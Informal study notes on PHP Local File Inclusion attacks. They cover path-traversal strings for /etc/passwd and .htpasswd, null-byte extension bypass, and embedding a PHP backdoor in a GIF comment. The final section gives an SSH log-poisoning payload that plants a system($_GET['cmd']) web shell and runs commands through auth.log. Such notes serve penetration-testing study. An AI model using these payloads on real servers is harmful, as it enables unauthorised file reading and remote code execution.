Local File Inclusion Basics : 

Why is LFI important ?? 

Reason  : 
	Even if a script is vulnerable but allow_url_include=Off then the RFI will not work !! !


LFI with Directory Prepends : 

  - as we don not know how move further we can use : 
	path traversal attack : 
	../../../../../...../etc/passwd 
	add ../ until you get the directory 

	use can also use ../../../.htaccess
	../../../../.htpasswd

Remote code execution with LFI and File Upload : 

 LFI + File Upload to RCE
  
  - Upload Image file embedded with php code 
	- Double extension is disabled 
  - Use LFI to execute image file 

 Steps : 
	- take a backdoor and a gif and place the backdoor into gif comment section 
	- now fetch this file using the local file inclusion vulnerability 


LFI Appended Null Byte : 

LFI with File Extension Appended - NULL Byte Injection : 
	Here the scenario is something like this that all the files is being fetch from the particular 
	directory and server is forcefully adding a .html extension to every file. 
	
	To bypass these constraints we will use a null character (%00) which we will append to the end of the file name 
	like contact%00 not the code breaks at this null character and we have successfuly bypass the forced extension 

	for directory traversal we can use ../../../etc/passwd%00
	


Remote Code Execution and LFI Log Poisioning : 

  Some of the service use log files now if a attacker somehow manage to inject the code in log files and if these log files 
  are readable by the service then it could be possible that an LFI vulnerablitity exists then we could have RCE.

 	

Remote Code Execution and LFI ssh log poisoning : 

RCE with LFI and SSH Log Poisoning : 

  - auth.log is readable by all 
  - Username field is logged 
  - Use PHP Code for username 
  - Exploit LFI and get RCE 
 
command : ssh '<?php echo system($_GET["cmd"]); exit; ?>'@[ ipaddress ] 
	page=/var/log/auth.log&cmd=cat /etc/passwd
